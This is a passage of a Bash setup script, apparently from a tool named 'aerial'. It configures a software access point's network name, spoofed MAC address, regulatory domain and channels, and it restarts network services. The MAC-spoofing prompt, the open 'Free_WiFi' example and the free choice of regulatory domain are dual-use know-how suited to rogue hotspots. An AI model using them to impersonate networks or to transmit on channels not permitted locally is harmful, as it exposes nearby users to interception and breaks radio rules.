# 					Let's collect what user want.						#
# 	ESSID, MAC, channel, encryption OPEN or WEP(40bits or 104bits) or WPA2 (if hostapd is used)		#
# 	ESSID_MAC_CHAN_PROMPT is set to no, then that means that the script was ran at least once and 		#
#				aerial.conf have the necessary info. 						#
#		If some infos are missing then the user must be prompted again.					#
#################################################################################################################

#################################################################################################################
# Filtering user input for SoftAP's ESSID: Can be any printable, up to 31, character (except space and "\")	#
# 					ESSID must be entered							#
#################################################################################################################
	ESSID_HEAD(){ 
	clear
	$cecho ""$BLUE"S o f t  A P's  E S S I D , M A C , C R D A , C h a n n e l - M E N U"$END"" | centered_text
	echo
	$cecho ""$BLUE"Network Name: Extended Service Set Identification (ESSID)"$END"" | centered_text
	echo
	echo
	}

if [ "$ESSID_MAC_CHAN_PROMPT" = "no" ] && [ -n "`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "$ATHDRV" = "monitor" -o "$ATHDRV" = "no" ];then
	export ENCR_TYPE="`grep 'ENCRYPTION' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	if [ "$ENCR_TYPE" = "WPA2" ];then
		export ESSID_MAC_CHAN_PROMPT="yes"
	fi 
fi

if [ "$ESSID_MAC_CHAN_PROMPT" = "no" ] && [ -n "`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
	export ESSID="`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`"
		if [ -n "`grep 'MAC' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export MAC="`grep 'MC_ADDRS' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
		if [ -n "`grep 'CHANNEL' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export CHAN="`grep 'CHANNEL' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
		if [ -n "`grep 'ENCRYPTION' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export ENCR_TYPE="`grep 'ENCRYPTION' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
		if [ -n "`grep 'KEY' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export AP_KEY="`grep 'KEY' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
		if [ -n "`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export CRDA="`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
		if [ -n "`grep 'IEEE_802_11_mode' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export hostapd_mode="`grep 'IEEE_802_11_mode' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
		if [ "`grep 'IEEE_802_11n' $HOME_DIR/aerial.conf | awk '{print $2}'`" = "enabled" ];then
			export ieee80211n="1"
			export ht_capab="`grep 'HT_CAPAB' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		else
			export ieee80211n="0"
			export ht_capab="NONE"
		fi
		if [ -n "`grep 'WPS_PIN' $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export WPS_PIN="`grep 'WPS_PIN' $HOME_DIR/aerial.conf | awk '{print $2}'`"
		fi
else
	ESSID_HEAD
	# Make sure user knows that he/she can set ESSID_MAC_CHAN_PROMPT to no. (Don't prompt every time)
	if [ -n "`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
		echo "Please, have in mind that if you DON'T want to be prompted every time for your ESSID"
		$cecho "MAC, CRDA, channel, encryption and key (if not OPEN), you can set: "$RED"ESSID_MAC_CHAN_PROMPT yes"$END" to"
		$cecho ""$GREEN"ESSID_MAC_CHAN_PROMPT no"$END" in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
		echo
		echo "Enter the ESSID you would like your SoftAP"
		$cecho "to be called, [e.g."$RED"Free_WiFi"$END"]"
		$necho "Press ENTER for current ("$GREEN""`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`""$END"): "
	else
		echo "Enter the ESSID you would like your SoftAP"
		$necho "to be called, [e.g."$RED"Free_WiFi"$END"]: "
	fi
	while read ESSID; do
		if [ -z "${ESSID}" ] && [ -n "`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
			export ESSID="`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`"
			sed 's%ESSID .*%ESSID '$ESSID'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
			break
		elif [ -z "${ESSID}" ];then
			ESSID_HEAD
			$cecho ""$RED"You must enter at least ESSID"$END""
			echo "Must be up to 32 printable characters long without spaces"
			echo
			echo "Enter the ESSID you would like your SoftAP"
			$necho "to be called, [e.g."$RED"Free_WiFi"$END"]: "
		else
			ASCIISTRIPPED="`echo $ESSID | sed 's/[^[:graph:]]//g'`"
			SHORTLEN="`expr length "$ESSID"`"
				if [ "$SHORTLEN" -ge 1 ] && [ "$SHORTLEN" -le 32 ];then
					if [ "$ASCIISTRIPPED" = "$ESSID" ];then
						sed 's%ESSID .*%ESSID '$ESSID'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
						break
					else
						ESSID_HEAD
						$cecho ""$RED"$ESSID"$END" it's not a valid ESSID"
						echo "Must be up to 32 printable characters long without spaces"
						echo
						echo "Enter the ESSID you would like your SoftAP"
						$necho "to be called, [e.g."$RED"Free_WiFi"$END"]: "
					fi
				else
					ESSID_HEAD
					# Make sure user knows that he/she can set ESSID_MAC_CHAN_PROMPT to no. (Don't prompt every time)
					if [ -n "`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`" ];then
						echo "Please, have in mind that if you DON'T want to be prompted every time for your ESSID"
						$cecho "MAC, channel, encryption and key (if not OPEN), you can set: "$RED"ESSID_MAC_CHAN_PROMPT yes"$END" to"
						$cecho ""$GREEN"ESSID_MAC_CHAN_PROMPT no"$END" in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
						echo
						$cecho ""$RED"$ESSID"$END" it's not a valid ESSID"
						echo "Must be up to 32 printable characters long without spaces"
						echo
						echo "Enter the ESSID you would like your SoftAP"
						$cecho "to be called, [e.g."$RED"Free_WiFi"$END"]"
						$necho "Press ENTER for current ("$GREEN""`grep "ESSID " $HOME_DIR/aerial.conf | awk '{print $2}'`""$END"): "
					else
						$cecho ""$RED"$ESSID"$END" it's not a valid ESSID"
						echo "Must be up to 32 printable characters long without spaces"
						echo
						echo "Enter the ESSID you would like your SoftAP"
						$necho "to be called, [e.g."$RED"Free_WiFi"$END"]: "
					fi
				fi
		fi
	done
	#################################################################################################################
	#				Media Access Control Address (MAC) (Optional input)				#
	#														#
	# MAC address: Can be any HEX character,exact 12 characters long						#
	# MAC address can be blank. 											#
	# No input means use the current										#
	#################################################################################################################
	MAC_HEAD(){
 	clear
	$cecho ""$BLUE"S o f t  A P's  E S S I D , M A C , C R D A , C h a n n e l - M E N U"$END"" | centered_text
	echo
	$cecho ""$BLUE"Media Access Control Address (MAC address)"$END"" | centered_text
	echo
	echo
	}
	export MAC="`/sbin/ifconfig "$WIFACE" | grep -m1 'HWaddr' | awk '{print $5}' | awk '{print substr($1,1,17)}' | tr A-Z a-z`"
	MAC_HEAD
	$cecho "Enter your SoftAP's spoofed MAC (e.g."$RED"22:11:11:11:22:22"$END") [Optional]"
	$necho "Press ENTER for Current MAC ("$GREEN"$MAC"$END"): "
	while read MAC; do
		if [ -z "${MAC}" ]; then
			sed 's%MC_ADDRS.*%MC_ADDRS%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
			break
		else
			HEXSTRIPPED="`echo $MAC | sed 's/[^0-9A-Fa-f:]//g'`"
			SHORTLEN="`expr length "$MAC"`"
			if [ "$SHORTLEN" = 17 ];then
				if [ "$HEXSTRIPPED" = "$MAC" ];then
					sed 's%MC_ADDRS.*%MC_ADDRS '$MAC'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf	
					break
				else 
					MAC_HEAD
					$cecho ""$RED"$MAC"$END" it's not a valid MAC address"
					echo "Must be 12 HEX characters long"
					echo
					$cecho "Enter your SoftAP's spoofed MAC (e.g."$RED"22:11:11:11:22:22"$END") [Optional]"
					$necho "Press ENTER for Current MAC ("$GREEN"$MAC"$END"): "
				fi
			else
				MAC_HEAD
				$cecho ""$RED"$MAC"$END" it's not a valid MAC address"
				echo "Must be 12 HEX characters long"
				echo
				$cecho "Enter your SoftAP's spoofed MAC (e.g."$RED"22:11:11:11:22:22"$END") [Optional]"
				$necho "Press ENTER for Current MAC ("$GREEN"$MAC"$END"): "
			fi
		fi
	done
	##################################################################################################################
	# 				Central Regulatory Domain Agent (CRDA) (Optional input)				 #						
	#														 #
	# Can be: 													 #														 #
	# AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ BA BB BD BE BF BG BH BI BJ BL BM BN BO BQ BR BS BT BV BW BY BZ #
	# CA CC CD CF CG CH CI CK CL CM CN CO CR CU CV CW CX CY CZ DE DJ DK DM DO DZ EC EE EG EH ER ES ET FI FJ FK FM FO #
	# FR GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU ID IE IL IM IN IO IQ IR IS IT JE #
	# JM JO JP KE KG KH KI KM KN KP KR KW KY KZ LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO #
	# MP MQ MR MS MT MU MV MW MX MY MZ NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW #
	# PY QA RE RO RS RU RW SA SB SC SD SE SG SH SI SJ SK SL SM SN SO SR SS ST SV SX SY SZ TC TD TF TG TH TJ TK TL TM #
	# TN TO TR TT TV TW TZ UA UG UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW 00				 #
	#														 #
	# No input means use the current										 #
	##################################################################################################################
	clear
	if [ -n "`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`" ] && [ "`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`" != "98" -o "`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`" != "00" ];then
		export CRDA="`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	elif [ "`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`" = "98" ] || [ "`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`" = "00" ];then
 		# Sometimes when we are already connected to Internet (wireless) and we try to change CRDA then kernel report that CRDA is number 98
		# or is set 00 =world regulatory domain
		# If we disconnect and connect back again then CRDA is reported correctly
		service network-manager stop
		service networking stop
		service networking start
		service network-manager start
		sleep 1
		$necho "[....] Waiting to connect again to the Internet."
			until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
				for i in \| / - \\; do
					printf ' [%c]\b\b\b\b' $i 
					sleep .1 
				done 
			done
		$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "
		export CRDA="`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`"
		sleep 2
	else
		export CRDA="`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`"
	fi

	#if [ -n "`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`" ] && [ "`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`" != "98" ];then
	#	export CRDA="`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`"
	#else
	#	export CRDA="`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`"
	#fi

	while :
	do
		clear
		$cecho ""$BLUE"S o f t  A P's  E S S I D , M A C , C R D A , C h a n n e l - M E N U"$END"" | centered_text
		echo
		$cecho ""$BLUE"Central Regulatory Domain Agent (CRDA)"$END"" | centered_text
		echo
		echo
		echo "AD AE AF AG AI AL AM AO AQ AR AS AT AU AW AX AZ BA BB BD BE BF BG BH BI BJ"
		echo "BL BM BN BO BQ BR BS BT BV BW BY BZ CA CC CD CF CG CH CI CK CL CM CN CO CR"
		echo "CU CV CW CX CY CZ DE DJ DK DM DO DZ EC EE EG EH ER ES ET FI FJ FK FM FO FR"
		echo "GA GB GD GE GF GG GH GI GL GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU"
		echo "ID IE IL IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW KY KZ"
		echo "LA LB LC LI LK LR LS LT LU LV LY MA MC MD ME MF MG MH MK ML MM MN MO MP MQ"
		echo "MR MS MT MU MV MW MX MY MZ NA NC NE NF NG NI NL NO NP NR NU NZ OM PA PE PF"
		echo "PG PH PK PL PM PN PR PS PT PW PY QA RE RO RS RU RW SA SB SC SD SE SG SH SI"
		echo "SJ SK SL SM SN SO SR SS ST SV SX SY SZ TC TD TF TG TH TJ TK TL TM TN TO TR"
		echo "TT TV TW TZ UA UG UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT ZA ZM ZW 00"
		echo
		echo "If unsure about your country's CRDA visit:"
		echo ""$BLUE"https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2"$END""
		echo
		$cecho "NOTE: "00" (double zero) means World regulatory domain."
		$cecho "Enter your SoftAP's regulatory domain [Optional]"
		$necho "Press ENTER for current CRDA ("$GREEN"$CRDA"$END"): "
		read CRDA
			case $CRDA in
				AD|AE|AF|AG|AI|AL|AM|AO|AQ|AR|AS|AT|AU|AW|AX|AZ|BA|BB|BD|BE|BF|BG|BH|BI|BJ|BL|BM|BN|BO|BQ|BR|BS|BT|BV|BW|BY|BZ|CA|CC|CD|CF|CG|CH|CI|CK|CL|CM|CN|CO|CR|CU|CV|CW|CX|CY|CZ|DE|DJ|DK|DM|DO|DZ|EC|EE|EG|EH|ER|ES|ET|FI|FJ|FK|FM|FO|FR|GA|GB|GD|GE|GF|GG|GH|GI|GL|GM|GN|GP|GQ|GR|GS|GT|GU|GW|GY|HK|HM|HN|HR|HT|HU|ID|IE|IL|IM|IN|IO|IQ|IR|IS|IT|JE|JM|JO|JP|KE|KG|KH|KI|KM|KN|KP|KR|KW|KY|KZ|LA|LB|LC|LI|LK|LR|LS|LT|LU|LV|LY|MA|MC|MD|ME|MF|MG|MH|MK|ML|MM|MN|MO|MP|MQ|MR|MS|MT|MU|MV|MW|MX|MY|MZ|NA|NC|NE|NF|NG|NI|NL|NO|NP|NR|NU|NZ|OM|PA|PE|PF|PG|PH|PK|PL|PM|PN|PR|PS|PT|PW|PY|QA|RE|RO|RS|RU|RW|SA|SB|SC|SD|SE|SG|SH|SI|SJ|SK|SL|SM|SN|SO|SR|SS|ST|SV|SX|SY|SZ|TC|TD|TF|TG|TH|TJ|TK|TL|TM|TN|TO|TR|TT|TV|TW|TZ|UA|UG|UM|US|UY|UZ|VA|VC|VE|VG|VI|VN|VU|WF|WS|YE|YT|ZA|ZM|ZW|00)
					# Notify the kernel about the current regulatory domain.
					ifconfig $WIFACE up
					ifconfig $IFACE up
					iw reg set ISO_3166-1_alpha-2
					iw reg set $CRDA
					#modprobe cfg80211 ieee80211_regdom="$CRDA"
					sed 's%CRDA.*%CRDA '$CRDA'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
					sed 's%REGDOMAIN=.*%REGDOMAIN='$CRDA'%g' /etc/default/crda > /etc/default/crda1 && mv /etc/default/crda1 /etc/default/crda
					sleep 2
					break
				;;
				"")
					# Enter pressed (leave current)
					if [ "$CRDA" = "98" -o "$CRDA" = "00" ] || [ "`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`" = "98" -o "`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`" = "00" ] || [ "`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`" = "98" -o "`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`" = "00" ];then
						# Sometimes when we are already connected to Internet (wirelessly) and we try to change CRDA then kernel report that CRDA is number 98
						# or is set 00 =world regulatory domain
						# If we disconnect and connect back again then CRDA is reported correctly
						service network-manager stop
						service networking stop
						service networking start
						service network-manager start
						sleep 1
						$necho "[....] Waiting to connect again to the Internet."
							until [ "`/sbin/route -n | awk '($1 == "0.0.0.0") { print $NF ; exit }'`" != "" ];do
								for i in \| / - \\; do
									printf ' [%c]\b\b\b\b' $i 
									sleep .1 
								done 
							done
						$cecho "\r[ "$GREEN"ok"$END" ] Waiting to connect again to the Internet.     "
						export CRDA="`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`"
						sed 's%CRDA.*%CRDA '$CRDA'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%REGDOMAIN=.*%REGDOMAIN='$CRDA'%g' /etc/default/crda > /etc/default/crda1 && mv /etc/default/crda1 /etc/default/crda
					else
						export CRDA="`iw reg get | head -1 | awk '{print $2}' | sed 's%:%%g'`"
						sed 's%CRDA.*%CRDA '$CRDA'%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%REGDOMAIN=.*%REGDOMAIN='$CRDA'%g' /etc/default/crda > /etc/default/crda1 && mv /etc/default/crda1 /etc/default/crda
					fi
					break
				;;
				*)
					echo
					$cecho "! ! ! "$RED""$CRDA""$END" is an invalid option ! ! !"
					$cecho "Case Sensitive Input. (e.g."$GREEN"US"$END" not "$RED"us"$END") :"
					read -p 'Press ENTER to continue...' string;echo
				;;
			esac
		done

	#################################################################################################################
	#						CHANNELS (Optional input)					#
	#														#
	# Permitted channels:												#
	# 802.11g - 802.11g/n: 01 02 03 04 05 06 07 08 09 10 11 12 13							# 											#
	# 802.11a - 802.11a/n: 36 40 44 48 52 56 60 64									#
	#														#
	# Non permitted channels:											#
	# 802.11g - 802.11g/n: 14 (Japan)										# 											#
	# 802.11a - 802.11a/n: 100 104 108 112 116 120 124 128 132 136 140 149 153 157 161 165				#
	#														#
	# No input means use the current										#
	#														#
	# Working adapter     :Ubiquiti SR71-E Atheros - AR9280 channel 36						#
	# Not working adapter :Netgear WNDA3200 - Atheros AR9280 see (1)						#
	#														#
	# (1) http://ubuntuforums.org/showthread.php?t=2032357								#
	# http://planet.ipfire.org/post/5ghz-ap-with-hostapd								#
	# http://wiki.gentoo.org/wiki/Hostapd#802.11a.2Fn.2Fac_with_WPA2-PSK_and_CCMP					#
	# http://wireless.kernel.org/en/users/Drivers/ath10k/configuration						#
	#################################################################################################################
	IEEE_802_11n_20Mhz_Suggested_Channels(){ 
	for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
		do 
			export sug_chan_20Mhz="`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`"
			export sug_chan_20Mhz_plus_2="`expr $sug_chan_20Mhz + 2`"
			export sug_chan_20Mhz_plus_1="`expr $sug_chan_20Mhz + 1`"
			if [ "$sug_chan_20Mhz" -ge 36 ] && [ "$sug_chan_20Mhz" -le 64 ];then
				export sug_chan_20Mhz_plus_2="`expr $sug_chan_20Mhz + 4`"
				export sug_chan_20Mhz_plus_1="`expr $sug_chan_20Mhz + 4`"
			fi
			if [ "$sug_chan_20Mhz_plus_2" -ge 11 -a "$sug_chan_20Mhz_plus_2" -le 15 ];then
				export  sug_chan_20Mhz_plus_2="$sug_chan_20Mhz_plus_1"
			fi
			if [ "$sug_chan_20Mhz_plus_1" -ge 1 -a "$sug_chan_20Mhz_plus_1" -le 9 ] && [ "`expr length "$sug_chan_20Mhz_plus_1"`" = "1" ];then
				export sug_chan_20Mhz_plus_1=0$sug_chan_20Mhz_plus_1
			fi
			if [ "$sug_chan_20Mhz_plus_2" -ge 1 -a "$sug_chan_20Mhz_plus_2" -le 9 ] && [ "`expr length "$sug_chan_20Mhz_plus_2"`" = "1" ];then
				export sug_chan_20Mhz_plus_2=0$sug_chan_20Mhz_plus_2
			fi
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep "$sug_chan_20Mhz_plus_2"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep "$sug_chan_20Mhz_plus_1"`" ];then
				echo "$sug_chan_20Mhz" >> $MEM_DIR/suggested_channels_20Mhz.txt
			fi	
		done

	for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
		do 
			export sug_chan_20Mhz="`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`"
			export sug_chan_20Mhz_minus_2="`expr $sug_chan_20Mhz - 2`"
			export sug_chan_20Mhz_minus_1="`expr $sug_chan_20Mhz - 1`"
			if [ "$sug_chan_20Mhz" -ge 36 ] && [ "$sug_chan_20Mhz" -le 64 ];then
				export sug_chan_20Mhz_minus_2="`expr $sug_chan_20Mhz - 4`"
				export sug_chan_20Mhz_minus_1="`expr $sug_chan_20Mhz - 4`"
			fi
			if [ "$sug_chan_20Mhz_minus_2" -ge 0 -a "$sug_chan_20Mhz_minus_1" -le 3 ];then
				export sug_chan_20Mhz_minus_2="$sug_chan_20Mhz_minus_1"
			fi
			if [ "$sug_chan_20Mhz_minus_1" -ge 1 -a "$sug_chan_20Mhz_minus_1" -le 9 ] && [ "`expr length "$sug_chan_20Mhz_minus_1"`" = "1" ];then
				export sug_chan_20Mhz_minus_1=0$sug_chan_20Mhz_minus_1
			fi
			if [ "$sug_chan_20Mhz_minus_2" -ge 1 -a "$sug_chan_20Mhz_minus_2" -le 9 ] && [ "`expr length "$sug_chan_20Mhz_minus_2"`" = "1" ];then
				export sug_chan_20Mhz_minus_2=0$sug_chan_20Mhz_minus_2
			fi
			if [ "$sug_chan_20Mhz_minus_2" -ge 1 -a "$sug_chan_20Mhz_minus_1" -ge 1 ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep -- "$sug_chan_20Mhz_minus_2"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep -- "$sug_chan_20Mhz_minus_1"`" ];then
				echo "$sug_chan_20Mhz" >> $MEM_DIR/suggested_channels_20Mhz.txt
			fi
		done
	}

	IEEE_802_11n_40Mhz_Suggested_Channels(){ 
	for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
		do 
			export sug_chan_40Mhz="`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`"
			export sug_chan_40Mhz_plus_4="`expr $sug_chan_40Mhz + 4`"
			export sug_chan_40Mhz_plus_2="`expr $sug_chan_40Mhz + 2`"
			if [ "$sug_chan_40Mhz" -ge 36 -a "$sug_chan_40Mhz" -le 60 ];then
				export sug_chan_40Mhz_plus_4="`expr $sug_chan_40Mhz + 4`"
				export sug_chan_40Mhz_plus_2="`expr $sug_chan_40Mhz + 4`"
			fi
			if [ "$sug_chan_40Mhz_plus_4" -ge 1 -a "$sug_chan_40Mhz_plus_4" -le 9 ] && [ "`expr length "$sug_chan_40Mhz_plus_4"`" = "1" ];then
				export sug_chan_40Mhz_plus_4=0$sug_chan_40Mhz_plus_4
			fi
			if [ "$sug_chan_40Mhz_plus_2" -ge 1 -a "$sug_chan_40Mhz_plus_2" -le 9 ] && [ "`expr length "$sug_chan_40Mhz_plus_2"`" = "1" ];then
				export sug_chan_40Mhz_plus_2=0$sug_chan_40Mhz_plus_2
			fi
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep "$sug_chan_40Mhz_plus_4"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep "$sug_chan_40Mhz_plus_2"`" ];then
				echo "$sug_chan_40Mhz" >> $MEM_DIR/suggested_channels_40Mhz.txt
			fi	
		done

	for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
		do 
			export sug_chan_40Mhz="`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`"
			export sug_chan_40Mhz_minus_4="`expr $sug_chan_40Mhz - 4`"
			export sug_chan_40Mhz_minus_2="`expr $sug_chan_40Mhz - 2`"
			if [ "$sug_chan_40Mhz" -ge 36 -a "$sug_chan_40Mhz" -le 60 ];then
				export sug_chan_40Mhz_minus_4="`expr $sug_chan_40Mhz - 4`"
				export sug_chan_40Mhz_minus_2="`expr $sug_chan_40Mhz - 4`"
			fi
			if [ "$sug_chan_40Mhz_minus_4" -ge 1 -a "$sug_chan_40Mhz_minus_4" -le 9 ] && [ "`expr length "$sug_chan_40Mhz_minus_4"`" = "1" ];then
				export sug_chan_40Mhz_minus_4=0$sug_chan_40Mhz_minus_4
			fi
			if [ "$sug_chan_40Mhz_minus_2" -ge 1 -a "$sug_chan_40Mhz_minus_2" -le 9 ] && [ "`expr length "$sug_chan_40Mhz_minus_2"`" = "1" ];then
				export sug_chan_40Mhz_minus_2=0$sug_chan_40Mhz_minus_2
			fi
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep -- "$sug_chan_40Mhz_minus_4"`" ] && [ -n "`grep "Free" $MEM_DIR/channels.txt | sed 's%802.11%%g' | grep -- "$sug_chan_40Mhz_minus_2"`" ];then
				echo "$sug_chan_40Mhz" >> $MEM_DIR/suggested_channels_40Mhz.txt
			fi
		done
	}

	Channels_in_rows(){
	# 802.11a - 802.11a/n channels
	if [ -f $MEM_DIR/channels.txt ] && [ -n "`grep "802.11a" $MEM_DIR/channels.txt`" ];then
		echo "Channel No   Status       IEEE 802.11 specification" >> $MEM_DIR/channels_80211a.txt
			for i in $(seq 1 "`grep "802.11a" $MEM_DIR/channels.txt | wc -l`")
				do
					if [ -n "`grep "802.11a" $MEM_DIR/channels.txt | sed -n ''$i',+0p'`" ];then
						echo "`grep "802.11a" $MEM_DIR/channels.txt | sed -n ''$i',+0p'`" >> $MEM_DIR/channels_80211a.txt
					fi
				done
	fi
	# 802.11g - 802.11g/n channels
	if [ -f $MEM_DIR/channels.txt ] && [ -n "`grep "802.11g" $MEM_DIR/channels.txt`" ];then
		echo "Channel No   Status       IEEE 802.11 specification" >> $MEM_DIR/channels_80211g.txt
			for i in $(seq 1 "`grep "802.11g" $MEM_DIR/channels.txt | wc -l`")
				do
					if [ -n "`grep "802.11g" $MEM_DIR/channels.txt | sed -n ''$i',+0p'`" ];then
						echo "`grep "802.11g" $MEM_DIR/channels.txt | sed -n ''$i',+0p'`" >> $MEM_DIR/channels_80211g.txt
					fi
				done
	fi
	# Print them and delete them
	if [ -f $MEM_DIR/channels_80211g.txt ] && [ -f $MEM_DIR/channels_80211a.txt ];then
		export Columns="`tput cols`"
		pr -W $Columns -m -t $MEM_DIR/channels_80211g.txt $MEM_DIR/channels_80211a.txt
		rm $MEM_DIR/channels_80211g.txt
		rm $MEM_DIR/channels_80211a.txt
	elif [ -f $MEM_DIR/channels_80211g.txt ];then
		cat $MEM_DIR/channels_80211g.txt
		rm $MEM_DIR/channels_80211g.txt
	elif [ -f $MEM_DIR/channels_80211a.txt ];then
		cat $MEM_DIR/channels_80211a.txt
		rm $MEM_DIR/channels_80211a.txt
	fi
	}

	Channels_HEAD(){
	clear
	$cecho ""$BLUE"S o f t  A P's  E S S I D , M A C , C R D A , C h a n n e l - M E N U"$END"" | centered_text
	echo
	$cecho ""$BLUE"Wireless Local Area Network Channels"$END"" | centered_text
	echo
	echo
	}

	Suggested_Channels(){
	Channels_in_rows
	echo

	if [ "$ieee80211n" = "1" ];then
		IEEE_802_11n_20Mhz_Suggested_Channels
		IEEE_802_11n_40Mhz_Suggested_Channels
		# Suggested IEEE 802.11a Channels
		if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "36\|40\|44\|48\|52\|56\|60\|64\|100\|104\|108\|112\|116\|120\|124\|128\|132\|136\|140\|149\|153\|157\|161\|165"`" ];then
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "36\|40\|44\|48\|52\|56\|60\|64\|100\|104\|108\|112\|116\|120\|124\|128\|132\|136\|140\|149\|153\|157\|161\|165"`" ];then
				$necho "Suggested 802.11a Channels                  max  54Mbit/s : "
					for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
					do
						if [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -ge 36 ] && [ "`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" -le 165 ];then
							$necho "$GREEN""`grep "Free" $MEM_DIR/channels.txt | awk '{print $1}' | sed -n ''$i',+0p'`" "$END"
						fi
					done
				echo
			else
				$necho "Suggested 802.11a Channels                  max  54Mbit/s : "$RED"None. All seems to be reserved."$END""
			fi
		fi
		# Suggested IEEE 802.11g Channels
		if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "01\|02\|03\|04\|05\|06\|07\|08\|09\|10\|12\|12\|13\|14"`" ];then
			if [ -n "`grep "Free" $MEM_DIR/channels.txt | grep "01\|02\|03\|04\|05\|06\|07\|08\|09\|10\|12\|12\|13\|14"`" ];then
				$necho "Suggested 802.11g Channels                  max  54Mbit/s : "
					for i in $(seq 1 "`grep "Free" $MEM_DIR/channels.txt | wc -l`")
					do
